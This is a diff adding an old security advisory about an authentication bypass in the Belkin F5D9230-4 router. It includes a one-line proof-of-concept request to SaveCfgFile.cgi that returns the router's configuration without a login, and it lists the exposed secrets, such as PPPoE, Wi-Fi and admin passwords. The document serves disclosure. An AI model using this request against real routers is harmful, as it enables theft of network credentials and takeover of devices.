@@ -1,0 +1,67 @@
+##
+## VULNERABILITY:
+##
+##  Belkin Wireless G Plus MIMO Router F5D9230-4
+##  Authentication Bypass Vulnerability
+##
+##
+## AUTHOR:
+##
+##  DarkFig < gmdarkfig (at) gmail (dot) com >
+##  http://acid-root.new.fr/?0:17
+##  #acidroot@irc.worldnet.net
+##
+##
+## INTRODUCTION:
+##
+##  I recently bought this router for my local
+##  network (without modem integrated), now I can tell
+##  that it was a bad choice. When my ISP disconnects
+##  me from internet, in the most case I have to reboot
+##  my Modem and the Router in order to reconnect.
+##  So I coded a program (which send http packets) to reboot
+##  my router, it asks me the router password, and reboots it.
+##  One day I wrote a bad password, but it worked. So I
+##  decided to make some tests in order to see if there was
+##  a vulnerability.
+##
+##
+## DESCRIPTION:
+##
+##  Apparently when the router starts, it creates a file
+##  (without content) named user.conf, then when we go to
+##  SaveCfgFile.cgi, the configuration is saved to the file
+##  user.conf. But the problem is that we can access to the
+##  file SaveCfgFile.cgi without login.
+##
+##
+## PROOF OF CONCEPT:
+## 
+##  For example we can get the configuration file here:
+##  http://<ROUTER_IP>/SaveCfgFile.cgi
+## 
+##  pppoe_username=...
+##  pppoe_password=...
+##  wl0_pskkey=...
+##  wl0_key1=...
+##  mradius_password=...
+##  mradius_secret=...
+##  httpd_password=...
+##  http_passwd=...
+##  pppoe_passwd=...
+##
+##
+##  Tested on the latest firmware for this product
+##  (version 3.01.53). 
+##
+##
+## PATCH:
+##  
+##  Actually (08-01-19) there is no firmware update, but I
+##  contacted the author, if they'll release a patch, it
+##  will be available here:
+##  http://web.belkin.com/support/download/download.asp
+##  ?download=F5D9230-4&lang=1&mode=
+##
+
+# milw0rm.com [2008-01-20]
